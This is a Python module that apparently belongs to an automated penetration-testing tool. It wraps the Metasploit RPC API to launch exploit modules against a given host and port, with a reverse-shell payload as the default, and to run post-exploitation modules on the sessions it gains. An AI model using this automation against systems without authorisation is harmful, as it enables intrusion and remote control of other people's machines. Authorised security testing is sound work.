"""Metasploit RPC client"""

import asyncio
from datetime import datetime
from typing import Optional, Dict, Any
from loguru import logger

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    logger.warning("pymetasploit3 not installed")
    MsfRpcClient = None

from core.models import ExploitResult


class MetasploitClient:
    """Metasploit Framework RPC client"""
    
    def __init__(self, config):
        self.config = config
        self.client = None
        self.console = None
    
    async def connect(self):
        """Connect to Metasploit RPC"""
        if not MsfRpcClient:
            raise ImportError("pymetasploit3 is required for Metasploit integration")
        
        try:
            self.client = MsfRpcClient(
                password=self.config.tools.metasploit_password,
                server=self.config.tools.metasploit_host,
                port=self.config.tools.metasploit_port,
                ssl=True
            )
            logger.info("✅ Connected to Metasploit RPC")
        except Exception as e:
            logger.error(f"Failed to connect to Metasploit: {e}")
            raise
    
    async def disconnect(self):
        """Disconnect from Metasploit"""
        if self.client:
            self.client = None
            logger.info("Disconnected from Metasploit")
    
    async def run_exploit(
        self,
        module: str,
        target: str,
        port: int,
        payload: str = 'generic/shell_reverse_tcp'
    ) -> ExploitResult:
        """Run an exploit module"""
        
        result = ExploitResult(
            vulnerability_id=f"{target}:{port}",
            success=False,
            exploit_used=module,
            timestamp=datetime.now()
        )
        
        try:
            # Load exploit module
            exploit = self.client.modules.use('exploit', module)
            
            # Set options
            exploit['RHOSTS'] = target
            exploit['RPORT'] = port
            
            # Set payload
            exploit.payload = payload
            
            # Execute
            logger.info(f"Executing {module} against {target}:{port}")
            exploit_result = exploit.execute()
            
            # Check for session
            if exploit_result and 'session_id' in exploit_result:
                result.success = True
                result.session_id = str(exploit_result['session_id'])
                result.evidence = {
                    'session_created': True,
                    'session_id': result.session_id
                }
                logger.success(f"✅ Exploit successful! Session: {result.session_id}")
            else:
                result.error = "No session created"
                logger.warning(f"Exploit executed but no session created")
            
        except Exception as e:
            result.error = str(e)
            logger.error(f"Exploit failed: {e}")
        
        return result
    
    async def get_sessions(self) -> list:
        """Get active sessions"""
        if not self.client:
            return []
        
        try:
            sessions = self.client.sessions.list
            return list(sessions.keys())
        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            return []
    
    async def run_post_module(self, session_id: str, module: str) -> Dict[str, Any]:
        """Run a post-exploitation module"""
        try:
            post = self.client.modules.use('post', module)
            post['SESSION'] = session_id
            result = post.execute()
            return result
        except Exception as e:
            logger.error(f"Post module failed: {e}")
            return {}
